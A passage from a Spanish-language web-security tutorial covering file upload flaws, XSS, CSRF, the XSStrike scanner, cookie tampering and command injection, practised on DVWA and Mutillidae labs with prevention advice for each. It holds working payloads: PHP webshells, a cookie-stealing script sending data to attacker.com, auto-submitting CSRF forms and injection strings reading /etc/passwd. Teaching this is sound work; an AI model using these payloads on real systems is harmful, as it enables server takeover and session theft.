- [Pentestmonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [OWASP Testing Guide - File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

### ✅ Resumen final

| Concepto                   | Explicación                                                    |
| -------------------------- | -------------------------------------------------------------- |
| **WebShell**               | Script web que da acceso remoto a un servidor web.             |
| **Lenguajes comunes**      | PHP, JSP, ASPX, Python, Perl                                   |
| **Uso principal**          | Ejecutar comandos, moverse por el servidor, subir malware.     |
| **Método de subida**       | Mediante vulnerabilidades como File Upload o LFI.              |
| **Entorno para practicar** | DVWA, Mutillidae, Kali, XAMPP                                  |
| **Prevención**             | Validar uploads, restringir ejecución, WAF, monitoreo de logs. |

---

[🔼](#índice)

---

## **65. Unrestricted File Upload**

### 🧠 ¿Qué es Unrestricted File Upload?

Es una **vulnerabilidad crítica** que ocurre cuando una aplicación web **permite subir archivos sin las validaciones adecuadas**, lo que permite a un atacante subir archivos peligrosos como:

- **WebShells (acceso remoto al servidor)**
- Archivos con **scripts maliciosos**
- Imágenes modificadas con código oculto

🔴 Esta vulnerabilidad puede llevar a una **toma total del servidor web**.

---

#### 🧪 Ejemplo muy simple

Imagínate un formulario que permite subir una imagen:

```html
<form method="POST" enctype="multipart/form-data" action="upload.php">
  <input type="file" name="archivo" />
  <input type="submit" value="Subir" />
</form>
```

Y el servidor procesa así:

```php
<?php
move_uploaded_file($_FILES["archivo"]["tmp_name"], "uploads/" . $_FILES["archivo"]["name"]);
?>
```

✅ Permite subir cualquier archivo sin verificar qué tipo es, ni validarlo.

---

#### ☠️ Ejemplo de ataque

Subimos un archivo llamado:

```
shell.php
```

Contenido del archivo:

```php
<?php system($_GET["cmd"]); ?>
```

Una vez subido, el atacante accede a:

```
http://victima.com/uploads/shell.php?cmd=whoami
```

✅ El servidor ejecuta comandos del sistema por el navegador. 🔥

---

### ⚙️ ¿Cómo explotar esta vulnerabilidad? (En laboratorio)

#### 🧪 Paso 1: Instalar entorno vulnerable

Usaremos **DVWA** (Damn Vulnerable Web Application):

---

##### ✅ A. Instalar DVWA (en Windows con XAMPP)

1. Instala [XAMPP](https://www.apachefriends.org/es/index.html)
2. Descarga DVWA desde GitHub:
   👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
3. Copia la carpeta `dvwa` a:

```
C:\xampp\htdocs\
```

4. Abre navegador:

   ```
   http://localhost/dvwa
   ```

5. Configura la base de datos:

   - Ve a: `http://localhost/dvwa/setup.php`
   - Haz clic en: “Create/Reset Database”

6. Ingresa con usuario: `admin` / `password`

7. En **DVWA Security** pon el nivel en **Low**

---

##### ✅ B. Ir a la sección: _File Upload_

```
http://localhost/dvwa/vulnerabilities/upload/
```

Sube un archivo `.php` como este:

```php
<?php system($_GET["cmd"]); ?>
```

Lo nombras: `shell.php`

---

##### ✅ C. Verifica que se subió

Visita:

```
http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami
```

✔️ Verás el resultado del comando.

---

### 🔒 ¿Cómo prevenir Unrestricted File Upload?

#### ✅ 1. Verificar la **extensión** del archivo

```php
$permitidas = ['jpg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['archivo']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $permitidas)) {
    die("Extensión no permitida");
}
```

---

#### ✅ 2. Verificar el **tipo MIME** real del archivo

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$tipo = finfo_file($finfo, $_FILES['archivo']['tmp_name']);

if (!in_array($tipo, ['image/jpeg', 'image/png'])) {
    die("Archivo no válido");
}
```

---

#### ✅ 3. Renombrar el archivo

Nunca uses el nombre original:

```php
$nombre_nuevo = uniqid() . '.' . $ext;
move_uploaded_file($_FILES["archivo"]["tmp_name"], "uploads/" . $nombre_nuevo);
```

---

#### ✅ 4. Guardar los archivos **fuera del directorio público**

Y servirlos desde un script que los valida.

---

#### ✅ 5. Desactivar ejecución de scripts en la carpeta de subida

Si usas Apache:
En el directorio `uploads/`, crea un archivo `.htaccess` con:

```
php_flag engine off
```

Evita que se ejecute PHP ahí.

---

### 🔍 Cómo detectar si una web es vulnerable

1. Busca formularios de subida de archivos.
2. Intenta subir archivos `.php`, `.aspx`, `.jsp`.
3. Si rechaza la extensión, intenta usar doble extensión:

```
shell.php.jpg
```

4. También puedes probar con:

```php
GIF89a;
<?php system($_GET["cmd"]); ?>
```

⚠️ Esto lo hace parecer imagen pero contiene código PHP.

5. Si logras acceder luego por URL y ejecutar comandos → ¡es vulnerable!

---

### 💡 Automatizar pruebas con Burp Suite

1. Interceptas la solicitud de subida.
2. En la pestaña **Repeater**, cambias la extensión del archivo.
3. En **Intruder**, puedes hacer ataques automáticos probando distintas extensiones o payloads.

---

### 📚 WebShells para usar en pruebas

Repositorio con cientos de WebShells:
👉 [https://github.com/tennc/webshell](https://github.com/tennc/webshell)

---

### ✅ Resumen rápido

| Tema            | Explicación                                                       |
| --------------- | ----------------------------------------------------------------- |
| ¿Qué es?        | Subida de archivos sin validación que permite ejecución remota.   |
| Ejemplo         | Subir shell.php y ejecutar comandos con `?cmd=`                   |
| Riesgos         | Toma de control del servidor, robo de datos, ejecución remota     |
| Cómo explotarlo | Subiendo WebShells como `.php` en servidores que no filtran bien  |
| Cómo prevenir   | Validar extensión, MIME, renombrar archivos, desactivar ejecución |

---

### 🔧 Recursos útiles

- DVWA: [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
- OWASP File Upload Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- Mutillidae (otro entorno vulnerable): [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

---

[🔼](#índice)

---

## **66. HTML Injection y Cross-Site-Scripting (XSS)**

### ✅ 1️⃣ ¿Qué es HTML Injection?

**HTML Injection** es cuando un atacante inyecta **código HTML arbitrario** en la página web.

✅ La app no escapa el contenido enviado por el usuario.

✅ Resultado: el HTML inyectado se interpreta por el navegador.

---

#### ✅ 📌 Ejemplo MUY básico

Imagina un sitio vulnerable:

```php
<?php
echo "Hola, " . $_GET['name'];
?>
```

Si visitas:

```
https://victima.com/page.php?name=Juan
```

Muestra:

```
Hola, Juan
```

✅ Pero si inyectas:

```
https://victima.com/page.php?name=<b>Hacked</b>
```

El HTML se interpreta:

```
Hola, <b>Hacked</b>
```

✅ Resultado en la página:

**Hola, Hacked** (en negrita)

---

#### ✅ 📌 Otro ejemplo

Inyectar un enlace:

```
?name=<a href="https://malicioso.com">Click aquí</a>
```

✅ El visitante ve:

> Hola, [Click aquí](https://malicioso.com)

---

**Conclusión:** HTML Injection = Insertar HTML arbitrario en la página.

---

### ✅ 2️⃣ ¿Qué es Cross-Site Scripting (XSS)?

**XSS** es como **HTML Injection + JavaScript**.

✅ Es más peligroso porque puedes inyectar **scripts maliciosos** que se ejecutan en el navegador de la víctima.

---

#### ✅ 📌 ¿Qué permite XSS?

- Robar cookies de sesión.
- Realizar acciones en nombre del usuario (CSRF).
- Redirigir a sitios maliciosos.
- Mostrar formularios falsos (phishing).
- Instalar malware vía navegador.

---

### ✅ 3️⃣ Tipos de XSS (con ejemplos)

---

#### ① **Reflected XSS**

El payload se envía en la URL y se refleja de inmediato en la respuesta.

✅ Ejemplo de URL vulnerable:

```
https://victima.com/search.php?q=<script>alert(1)</script>
```

El servidor devuelve:

```
Resultados para: <script>alert(1)</script>
```

✅ Resultado:

El navegador ejecuta `alert(1)`.

---

#### ② **Stored XSS**

El payload se guarda en la base de datos o en un archivo, y se muestra a otros usuarios.

✅ Ejemplo:

En un foro, posteas:

```
<script>alert('XSS')</script>
```

Cualquiera que visite ese post ve la alerta.

---

#### ③ **DOM-Based XSS**

La vulnerabilidad está en el **JavaScript del lado del cliente**.

✅ Ejemplo en HTML:

```html
<p id="result"></p>
<script>
  const params = new URLSearchParams(location.search);
  document.getElementById("result").innerHTML = params.get("q");
</script>
```

Si visitas:

```
?q=<img src=x onerror=alert(1)>
```

Se inyecta en el DOM y se ejecuta.

---

### ✅ 4️⃣ Instalación de un entorno vulnerable para practicar

✅ Usaremos **DVWA** (Damn Vulnerable Web Application) o **Mutillidae II**.

---

#### 🟣 A. DVWA (en Windows con XAMPP)

✅ 1. Descarga XAMPP:

👉 [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)

✅ 2. Instala y abre el Panel de Control.

✅ 3. Inicia **Apache** y **MySQL**.

✅ 4. Descarga DVWA:

👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

✅ 5. Copia la carpeta `dvwa` en:

```
C:\xampp\htdocs\
```

✅ 6. Abre en navegador:

```
http://localhost/dvwa
```

✅ 7. Haz setup:

```
http://localhost/dvwa/setup.php
```

✅ 8. Cambia nivel de seguridad:

```
DVWA Security → Low
```

✅ 9. Accede a:

```
Vulnerabilities → XSS (Reflected) o XSS (Stored)
```

---

#### 🟣 B. Mutillidae II (Alternativa)

✅ Descargar:

👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

✅ Copiar en:

```
C:\xampp\htdocs\
```

✅ Acceder:

```
http://localhost/mutillidae
```

✅ Ejercicios:

```
OWASP Top 10 → A7 Cross-Site Scripting (XSS)
```

---

### ✅ 5️⃣ Cómo explotar XSS paso a paso

---

#### ✅ Ejemplo A: Reflected XSS en DVWA

1️⃣ Abre:

```
http://localhost/dvwa/vulnerabilities/xss_r/
```

2️⃣ Escribe:

```
<script>alert('XSS')</script>
```

3️⃣ Haz clic en **Submit**.

✅ Resultado:

➡️ Aparece un alert en el navegador.

---

#### ✅ Ejemplo B: Stored XSS en DVWA

1️⃣ Abre:

```
http://localhost/dvwa/vulnerabilities/xss_s/
```

2️⃣ Escribe en Name/Message:

```
<script>alert('Hacked!')</script>
```

3️⃣ Haz **Sign Guestbook**.

✅ Resultado:

➡️ Cualquiera que vea el libro de visitas ve el alert.

---

#### ✅ Ejemplo C: XSS con robo de cookies

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

✅ Envía las cookies a un servidor externo.

---

#### ✅ Ejemplo D: DOM-Based XSS

Si la página hace:

```javascript
document.getElementById("result").innerHTML = location.hash.substring(1);
```

Visita:

```
#<img src=x onerror=alert(1)>
```

✅ Ejecuta alert(1).

---

### ✅ 6️⃣ Cómo proteger aplicaciones de HTML Injection y XSS

✅ **Escapar HTML**

```php
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

✅ **Validar y sanitizar inputs**

- Solo permitir caracteres válidos.
- Usar **whitelists**.

✅ **Content Security Policy (CSP)**

Ejemplo de cabecera:

```
Content-Security-Policy: default-src 'self';
```

✅ **HTTPOnly y Secure en Cookies**

```
Set-Cookie: sessionid=abc123; HttpOnly; Secure
```

✅ **Escapar dinámicamente en JavaScript**

```javascript
element.textContent = userInput;
```

✅ **Usar frameworks seguros**

React, Angular, Vue → escapan automáticamente.

---

### ✅ 7️⃣ Resumen súper corto

| Vulnerabilidad             | Qué es                              | Ejemplo                       |
| -------------------------- | ----------------------------------- | ----------------------------- |
| **HTML Injection**         | Inyectar HTML arbitrario.           | `<b>negrita</b>`              |
| **XSS**                    | Inyectar y ejecutar JavaScript.     | `<script>alert(1)</script>`   |
| **Tipos de XSS**           | Reflected, Stored, DOM-Based.       | URL o inputs que ejecutan JS. |
| **Entorno para practicar** | DVWA, Mutillidae.                   | Laboratorios seguros.         |
| **Prevención**             | Escapar output, validar input, CSP. | `htmlspecialchars()`          |

---

### ✅ Recursos útiles

🔗 OWASP XSS Cheat Sheet:
👉 [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

🔗 DVWA:
👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

🔗 Mutillidae II:
👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

---

### ✅ Extra: Práctica con Burp Suite

✅ Intercepta la petición.

✅ Modifica el parámetro vulnerable con payload:

```
<script>alert(1)</script>
```

✅ Envia al navegador → observa ejecución.

✅ Usa Intruder para probar múltiples payloads.

---

Si quieres, puedo:

✅ Ayudarte a instalar DVWA o Mutillidae paso a paso.

✅ Diseñar un **plan de prácticas** para XSS.

✅ Enseñarte a **automatizar** pruebas con **Burp Suite** o **ZAP**.

¡Solo dime qué parte quieres profundizar! 🚀

---

[🔼](#índice)

---

## **67. CSRF**

### ✅ 1️⃣ ¿Qué es CSRF? (Explicación sencilla)

CSRF = **Cross-Site Request Forgery** (falsificación de petición en sitios cruzados).

✅ Es un ataque donde el atacante **engaña al navegador de la víctima** para enviar **una petición no autorizada** a una aplicación web en la que la víctima está autenticada.

---

#### 📌 Idea fácil

Imagina:

- Tú estás logueado en tu banco.
- Tu cookie de sesión está activa.
- El banco confía en las peticiones de tu navegador.

✅ El atacante te manda un enlace malicioso o un formulario oculto.

✅ Tu navegador **envía la petición al banco con tus cookies**.

✅ El banco cree que la orden vino de ti.

---

#### 🎯 Resultado:

✅ Cambio de contraseña

✅ Transferencia de dinero

✅ Cambiar correo del usuario

✅ Acciones administrativas

---

### ✅ 2️⃣ ¿Cómo funciona CSRF?

✅ La clave: El navegador **incluye automáticamente las cookies** en la petición.

➡️ El servidor no puede diferenciar **entre una petición legítima y una maliciosa** si no tiene protecciones.

---

### ✅ 3️⃣ Ejemplo MUY fácil

#### ✅ Escenario vulnerable

✅ Imagina un formulario para cambiar contraseña:

```html
<form action="https://victima.com/change-password" method="POST">
  <input type="hidden" name="password" value="nueva123" />
  <input type="submit" value="Cambiar" />
</form>
```

---

#### ✅ Ataque CSRF clásico

El atacante crea su propia página:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://victima.com/change-password" method="POST">
      <input type="hidden" name="password" value="hacked123" />
    </form>
  </body>
</html>
```

✅ ¿Qué pasa si la víctima abre esta página mientras está logueada?

➡️ Su navegador envía la petición al servidor legítimo, con su **cookie de sesión**.

➡️ El servidor procesa **el cambio de contraseña**.

---

✅ El usuario no ve nada → **ataque invisible**.

---

### ✅ 4️⃣ Explicación paso a paso

✅ Paso 1: Víctima está logueada en `victima.com`.

✅ Paso 2: Navegador tiene cookie de sesión válida.

✅ Paso 3: Atacante engaña a la víctima para visitar una página maliciosa.

✅ Paso 4: Esa página envía **una petición POST automática**.

✅ Paso 5: El servidor **confía en la cookie** → acepta la petición.

---

### ✅ 5️⃣ Otro ejemplo práctico

✅ URL vulnerable para cambiar email:

```
https://victima.com/change-email?email=hacker@evil.com
```

✅ Atacante envía por correo:

```
<img src="https://victima.com/change-email?email=hacker@evil.com">
```

✅ Cuando la víctima abre el email:

- Su navegador hace la petición GET.
- Incluye la cookie de sesión.
- El servidor **cambia el email**.

---

### ✅ 6️⃣ Cómo instalar un entorno vulnerable para practicar

✅ Las mejores aplicaciones para aprender CSRF de forma segura:

- ✅ **DVWA** (Damn Vulnerable Web App)
- ✅ **Mutillidae II**

---

#### 🟣 A. Instalar DVWA en Windows (con XAMPP)

✅ 1. Descarga XAMPP:

👉 [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)

✅ 2. Instala y abre **XAMPP Control Panel**.

✅ 3. Inicia **Apache** y **MySQL**.

✅ 4. Descarga DVWA:

👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

✅ 5. Copia la carpeta `dvwa` en:

```
C:\xampp\htdocs\
```

✅ 6. Abre en navegador:

```
http://localhost/dvwa
```

✅ 7. Setup Database:

```
http://localhost/dvwa/setup.php
```

✅ 8. Cambia el nivel de seguridad:

```
DVWA Security → Low
```

✅ 9. Accede:

```
Vulnerabilities → CSRF
```

---

#### 🟣 B. Instalar Mutillidae II (Alternativa)

✅ Descargar:

👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

✅ Copiar en:

```
C:\xampp\htdocs\
```

✅ Acceder:

```
http://localhost/mutillidae
```

✅ Ir a:

```
OWASP Top 10 → A8 Cross-Site Request Forgery (CSRF)
```

---

### ✅ 7️⃣ Cómo explotar CSRF en DVWA

#### ✅ DVWA → Vulnerability: CSRF

✅ Página vulnerable de DVWA:

```
http://localhost/dvwa/vulnerabilities/csrf/
```

✅ Verás un formulario para **cambiar la contraseña**:

```html
<form method="POST">
  New password: <input type="password" name="password_new" /> Confirm:
  <input type="password" name="password_conf" />
  <input type="submit" value="Change" />
</form>
```

---

✅ ⚔️ Ataque:

El atacante crea un HTML malicioso:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="POST">
      <input type="hidden" name="password_new" value="hacked123" />
      <input type="hidden" name="password_conf" value="hacked123" />
    </form>
  </body>
</html>
```

✅ Lo hospeda en su servidor.

✅ Víctima logueada en DVWA visita esa página.

✅ DVWA cambia la contraseña del usuario a "hacked123" **sin preguntar nada**.

---

✅ Resultado:

✅ Ataque invisible.

✅ No necesita la interacción del usuario más allá de **abrir la página maliciosa**.

---

### ✅ 8️⃣ Automatizar ataque con Burp Suite

✅ Burp Suite te ayuda a:

- Interceptar la petición legítima (cambio de contraseña).
- Repetirla (con **Repeater**).
- Modificar parámetros (con **Intruder**).
- Usar **CSRF PoC Generator** (algunas versiones lo incluyen).

---

✅ **Paso básico con Burp Suite:**

1️⃣ Intercepta el formulario real.

2️⃣ Copia la petición POST.

3️⃣ Modifica el contenido (nueva contraseña).

4️⃣ Genera el HTML malicioso para engañar a la víctima.

---

### ✅ 9️⃣ Cómo defenderse contra CSRF

✅ 💠 Usar **tokens anti-CSRF**:

- Incluye un **valor secreto único** en el formulario.
- El servidor verifica que el token sea válido.

✅ Ejemplo PHP:

```php
// Generar
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
```

```html
<input
  type="hidden"
  name="csrf_token"
  value="<?php echo $_SESSION['csrf_token']; ?>"
/>
```

✅ Verificar:

```php
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
  die("CSRF detected!");
}
```

---

✅ 💠 Usar **SameSite cookies**:

- Evita enviar cookies en peticiones cross-site.

```
Set-Cookie: sessionid=abc123; SameSite=Strict
```

---

✅ 💠 Validar métodos:

- Aceptar solo **POST** para acciones sensibles.
- Rechazar **GET** para cambios de estado.

---

✅ 💠 Usar cabeceras de seguridad:

```
X-Frame-Options: DENY
```

✅ Evita ataques de **clickjacking** que pueden combinarse con CSRF.

---

### ✅ 10 Resumen súper fácil

| Concepto                  | Explicación sencilla                                                                                  |
| ------------------------- | ----------------------------------------------------------------------------------------------------- |
| **CSRF**                  | Ataque que hace que la víctima realice acciones no autorizadas en una web en la que está autenticada. |
| **Claves del ataque**     | El navegador envía cookies automáticamente.                                                           |
| **Ejemplo clásico**       | Cambio de contraseña con formulario oculto.                                                           |
| **Prevención**            | Tokens CSRF, SameSite cookies, validar método HTTP.                                                   |
| **Entorno para práctica** | DVWA, Mutillidae.                                                                                     |

---

### ✅ 11 Recursos útiles

✅ OWASP CSRF Cheat Sheet:

👉 [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

✅ DVWA:

👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

✅ Mutillidae II:

👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

---

[🔼](#índice)

---

## **68. XSStrike**

### 🟣 1️⃣ ¿Qué es XSStrike?

**XSStrike** es una herramienta de _penetration testing_ **especializada en XSS (Cross-Site Scripting)**.

✅ Es **open source** y escrita en Python.

✅ Su objetivo es **detectar y explotar** vulnerabilidades XSS en aplicaciones web.

Pero no solo hace _fuzzing_ básico:

✨ Genera **payloads inteligentes**.

✨ Analiza cómo el servidor responde.

✨ Bypassea filtros comunes.

✨ Ayuda a encontrar **Reflected, Stored y DOM XSS**.

---

### 🟣 2️⃣ ¿Para qué sirve?

✅ Encuentra entradas XSS vulnerables.

✅ Genera **payloads únicos** para evadir filtros.

✅ Evalúa la seguridad de parámetros GET o POST.

✅ Te ayuda a validar sanitización del lado del servidor.

✅ Automatiza la tarea de _fuzzing_ para XSS.

✅ **Ideal para pentesters y bug bounty hunters.**

---

### 🟣 3️⃣ Instalación de XSStrike (súper fácil)

✅ XSStrike funciona en **Linux (Kali), macOS y Windows (con Python).**

Te muestro cómo instalarlo en **Kali / Linux / WSL / macOS** y **Windows**.

---

#### ✅ A. Requisitos previos

- Python 3
- Git

✅ En Kali o Ubuntu/WSL, instala:

```bash
sudo apt update
sudo apt install python3 python3-pip git
```

---

#### ✅ B. Descargar XSStrike

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
```

---

#### ✅ C. Instalar dependencias

```bash
pip3 install -r requirements.txt
```

✅ ¡Listo!

Para verificar que funciona:

```bash
python3 xsstrike.py --help
```

Verás algo así:

```
usage: xsstrike.py [options]
```

---

✅ **En Windows:**

1️⃣ Instala [Python 3](https://www.python.org/downloads/).

2️⃣ Abre **cmd** o **PowerShell**:

```powershell
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py --help
```

---

### 🟣 4️⃣ Estructura de XSStrike

El script principal es:

```bash
xsstrike.py
```

✅ Tiene **opciones de línea de comandos** para:

- URL objetivo
- Parámetro a atacar
- Modo interactivo
- Payloads personalizados

---

### 🟣 5️⃣ Ejemplo fácil: usar XSStrike en un sitio vulnerable

✅ Imagina un entorno **DVWA** con seguridad en "Low".

URL vulnerable:

```
http://localhost/dvwa/vulnerabilities/xss_r/?name=test
```

✅ El parámetro vulnerable es `name`.

---

#### ✅ A. Ataque básico

En XSStrike:

```bash
python3 xsstrike.py -u "http://localhost/dvwa/vulnerabilities/xss_r/?name=test"
```

✅ XSStrike hará:

- Fuzzing del parámetro `name`.
- Probará payloads.
- Mostrará si es vulnerable.

---

#### ✅ Resultado típico:

```
[+] Testing parameter: name
[+] Payload executed successfully!
[+] Vulnerable to XSS
```

✅ Confirmado ✅

---

#### ✅ B. Especificar parámetro

Si quieres atacar **un parámetro específico**:

```bash
python3 xsstrike.py -u "http://localhost/page.php?query=test" -p query
```

---

#### ✅ C. Escanear múltiples payloads

XSStrike tiene **payloads inteligentes** para evadir filtros:

```bash
python3 xsstrike.py -u "http://localhost/vulnerable.php?search=test" --fuzzer
```

✅ El fuzzer prueba combinaciones y muta payloads para evadir WAF o validaciones débiles.

---

#### ✅ D. Usar con POST

✅ Para formularios:

```bash
python3 xsstrike.py -u "http://localhost/form.php" --data "name=test&email=test@test.com"
```

---

✅ XSStrike también permite:

✅ Descubrir parámetros ocultos:

```bash
--params
```

✅ Generar PoC automáticos:

```bash
--poc
```

✅ Usar proxies (como Burp Suite):

```bash
--proxy http://127.0.0.1:8080
```

---

### 🟣 6️⃣ Usando XSStrike con Burp Suite

✅ Muchos pentesters integran XSStrike con **Burp**:

✅ Configurar proxy en XSStrike:

```bash
python3 xsstrike.py -u "http://target.com" --proxy http://127.0.0.1:8080
```

✅ Todo el tráfico de XSStrike pasa por Burp → ¡puedes interceptar, modificar y analizar las peticiones!

---

### 🟣 7️⃣ Entornos para practicar

✅ **DVWA** (Damn Vulnerable Web App):

✔️ Instalación:

```bash
git clone https://github.com/digininja/DVWA.git
```

✔️ Accede:

```
http://localhost/dvwa
```

✔️ Nivel: Low

✔️ Vulnerabilidad: XSS (Reflected, Stored)

---

✅ **Mutillidae II**:

✔️ Instalación:

```bash
git clone https://github.com/webpwnized/mutillidae.git
```

✔️ Accede:

```
http://localhost/mutillidae
```

✔️ Múltiples ejercicios de XSS.

---

✅ **bWAPP**:

✔️ Otro laboratorio vulnerable.

✔️ Fácil de instalar:

👉 [https://sourceforge.net/projects/bwapp/](https://sourceforge.net/projects/bwapp/)

---

### 🟣 8️⃣ Resumen de comandos más usados

✅ Ver ayuda:

```bash
python3 xsstrike.py --help
```

✅ Ataque simple:

```bash
python3 xsstrike.py -u "http://target.com/page.php?input=test"
```

✅ Especificar parámetro:

```bash
python3 xsstrike.py -u "http://target.com/page.php?input=test" -p input
```

✅ Fuzzer avanzado:

```bash
python3 xsstrike.py -u "http://target.com/page.php?input=test" --fuzzer
```

✅ Usar datos POST:

```bash
python3 xsstrike.py -u "http://target.com/form.php" --data "username=test&password=test"
```

✅ Usar proxy:

```bash
python3 xsstrike.py -u "http://target.com" --proxy http://127.0.0.1:8080
```

---

### 🟣 9️⃣ Ventajas de XSStrike

✅ Fácil de usar

✅ Payloads inteligentes

✅ Mutación automática para evadir WAF

✅ Descubrimiento de parámetros

✅ Generación de PoC

✅ Compatible con Burp Suite

---

### ✅ 10 Recursos útiles

🌐 Proyecto XSStrike:
👉 [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)

🌐 DVWA:
👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

🌐 Mutillidae II:
👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

🌐 OWASP XSS Cheat Sheet:
👉 [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

[🔼](#índice)

---

## **69. Otras técnicas de explotación: Cookie Tampering, command injection**

### 🎯 **1️⃣ Cookie Tampering**

---

#### ✅ ¿Qué es Cookie Tampering?

**Cookie Tampering** es **modificar el contenido de las cookies** para engañar al servidor.

✅ Muchas apps web confían en cookies para:

- Identificar usuarios
- Almacenar privilegios
- Recordar configuraciones

✅ Si la cookie **no está firmada o cifrada**, un atacante puede cambiarla.

---

#### ✅ Ejemplo MUY fácil

✅ Imagina que el servidor guarda una cookie así:

```
Set-Cookie: role=user;
```

El navegador la envía con cada petición:

```
Cookie: role=user
```

✅ El servidor **lee `role` y permite acceso de usuario normal**.

---

**Ataque → Cambiar a admin:**

```
Cookie: role=admin
```

✅ Resultado:

➡️ El servidor cree que el atacante es **administrador**.

---

#### ✅ Otro ejemplo típico

Cookie de sesión:

```
Set-Cookie: sessionid=12345;
```

Si es predecible, el atacante prueba:

```
sessionid=12346
```

➡️ Podría secuestrar la sesión de otro usuario.

---

#### ✅ Laboratorio para practicar: DVWA

✅ DVWA tiene un módulo llamado **Brute Force** (útil para entender cookies), y **Authentication Bypass**, pero para tampering de cookies también se pueden usar **nivele de seguridad** bajos para probar:

```
Cookie: security=low
```

✅ Cambia a:

```
security=high
```

El servidor aplicará más restricciones.

✅ ¡Puedes modificarla para probar comportamientos!

---

#### ✅ Herramientas para modificar cookies

✅ **Burp Suite**

- Intercepta la petición
- Edita la cookie en vivo

✅ **Browser DevTools**

- En Chrome → Aplicación → Cookies

✅ **EditThisCookie** (extensión Chrome)

- Edita cookies en navegador

---

#### ✅ Cómo prevenir Cookie Tampering

✅ Usar **cookies firmadas o cifradas**:

- Firmar el contenido con clave secreta del servidor
- Verificar firma al recibir

✅ Usar **Secure / HttpOnly / SameSite** flags:

```
Set-Cookie: role=user; Secure; HttpOnly; SameSite=Strict
```

✅ Nunca almacenar información sensible en cookies sin protección.

✅ Asociar sesión en el servidor → no confiar solo en valores del cliente.

---

### ✅ Ejemplo práctico con Burp Suite

1️⃣ Abre Burp Suite

2️⃣ Configura el navegador para usar el proxy

3️⃣ Ingresa al sitio vulnerable

4️⃣ Intercepta la petición con la cookie

```
Cookie: role=user
```

5️⃣ Cambia:

```
Cookie: role=admin
```

6️⃣ Forward → Observa respuesta del servidor

---

✅ Resultado:

- Si la app no valida, tendrás acceso elevado.

---

### ✅ Resumen rápido de Cookie Tampering

| Tema         | Explicación sencilla                                  |
| ------------ | ----------------------------------------------------- |
| Qué es       | Modificar cookies para engañar al servidor            |
| Ejemplo      | Cambiar `role=user` → `role=admin`                    |
| Herramientas | Burp Suite, DevTools, EditThisCookie                  |
| Prevención   | Firmar/cifrar cookies, Secure/HttpOnly/SameSite flags |
| Práctica     | DVWA, Burp Suite para interceptar y modificar cookies |

---

### 🎯 **2️⃣ Command Injection**

---

#### ✅ ¿Qué es Command Injection?

✅ **Command Injection** es una vulnerabilidad donde la app **ejecuta comandos del sistema operativo** con datos del usuario **sin validarlos bien**.

➡️ Permite a un atacante **inyectar comandos maliciosos**.

---

#### ✅ Idea fácil

Imagina este código PHP:

```php
$user_input = $_GET['ip'];
system("ping " . $user_input);
```

✅ Usuario envía:

```
?ip=127.0.0.1
```

Comando ejecutado:

```
ping 127.0.0.1
```

✅ Ataque:

```
?ip=127.0.0.1; ls
```

Comando ejecutado:

```
ping 127.0.0.1; ls
```

✅ Resultado:

- Hace ping **y además** lista archivos en el servidor.

---

#### ✅ Ejemplo MUY sencillo

✅ Linux:

```
?ip=127.0.0.1; cat /etc/passwd
```

✅ Windows:

```
?ip=127.0.0.1 & dir
```

---

#### ✅ Cómo explotar Command Injection (entorno de prueba)

✅ DVWA → Módulo **Command Injection**

**URL de ejemplo:**

```
http://localhost/dvwa/vulnerabilities/exec/
```

✅ Formulario vulnerable:

```
Enter IP address:
```

✅ Ataque típico:

```
127.0.0.1; ls
```

✅ Resultado:

- Ping más listado de directorios del servidor.

---

#### ✅ Instalación del entorno para practicar

✅ DVWA (Damn Vulnerable Web Application)

✅ En Windows con XAMPP:

1️⃣ Descargar XAMPP:
👉 [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)

2️⃣ Instalar y abrir Panel de Control

3️⃣ Iniciar Apache y MySQL

